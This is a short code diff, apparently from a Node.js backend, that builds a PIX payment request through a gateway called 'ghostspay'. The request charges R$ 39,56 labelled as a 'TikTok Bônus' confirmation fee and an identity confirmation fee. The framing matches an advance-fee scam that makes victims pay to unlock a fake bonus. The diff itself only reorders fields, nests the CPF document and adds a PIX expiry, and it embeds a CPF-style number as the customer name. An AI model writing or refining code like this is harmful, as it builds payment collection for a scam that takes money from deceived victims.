@@ -74,22 +74,23 @@ app.post('/api/ghostspay/pix-taxa', async (req, res) => {
   const amount = 3956; // R$ 39,56 em centavos
 
   const payload = {
-    amount,
-    paymentMethod: 'PIX',
-    description: 'Taxa de confirmação TikTok Bônus',
     customer: {
       name: 'CPF 112.389.905-33',
       email: 'cpf11238990533@example.com',
       phone: '11999999999',
-      document: cpfNumero
+      document: { number: cpfNumero, type: 'CPF' }
     },
+    paymentMethod: 'PIX',
+    amount,
     items: [
       {
         title: 'Taxa de confirmação de identidade',
         unitPrice: amount,
         quantity: 1
       }
-    ]
+    ],
+    pix: { expiresInDays: 1 },
+    description: 'Taxa de confirmação TikTok Bônus'
   };
 
   if (GHOSTSPAY_POSTBACK_URL) {
